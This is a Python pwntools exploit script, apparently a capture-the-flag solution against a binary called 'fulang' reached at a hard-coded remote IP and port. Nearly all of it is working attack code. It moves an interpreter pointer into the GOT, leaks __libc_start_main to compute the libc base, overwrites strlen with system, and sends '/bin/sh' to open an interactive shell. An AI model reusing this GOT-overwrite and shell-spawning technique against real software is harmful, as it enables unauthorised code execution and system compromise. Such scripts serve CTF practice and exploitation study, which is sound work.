from pwn import *
import sys

context.log_level = 'DEBUG'

if len(sys.argv) > 1:
    r = process('./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f')
else:
    r = remote('69.90.132.40', 4001)
    #r = remote('10.100.16.126', 4001)

r.recvuntil(':')

thing = ':<' * 0x20 # fu now points to itself
# write low byte to put us in GOT
thing += ':.'
# read out libc_s_m entry (starting at 0x0804a024)
thing += ':::>'*4
# write puts to restart main
thing += ':<'*12
thing += ':.:>'*4



r.sendline(thing)

r.send('\x24') # write low byte to get to libc_s_m

# read out entry
s = ""
for _ in range(4):
    s+=r.recv(1)
libc_s_m_addr = u32(s)

# write puts to restart main
for c in p32(0x080484e0):
    r.send(c)

print "libc_s_m addr:", hex(libc_s_m_addr)

libc = ELF('/lib32/libc.so.6')
libc.address = (libc_s_m_addr - libc.symbols['__libc_start_main'])
print "libc base:", hex(libc.address)
print "system:", hex(libc.symbols['system'])

# RESTART 1

r.recvuntil(':')

thing = ':<' * 0x20 # fu now points to itself
# write low byte to put us in GOT
thing += ':.'
# write over strlen
thing += ':.:>'*4
# read it back out
thing += ':<::'*4

r.sendline(thing)

# set strlen = system

r.send('\x20') # write low byte to move to strlen

for c in p32(libc.symbols['system']):
    r.send(c)

# read out entry
s = ""
for _ in range(4):
    s = r.recv(1) + s
read_addr = u32(s)

print "system read back:",hex(read_addr)

# RESTART 2

r.recvuntil(':')

r.sendline("/bin/sh")

r.interactive()

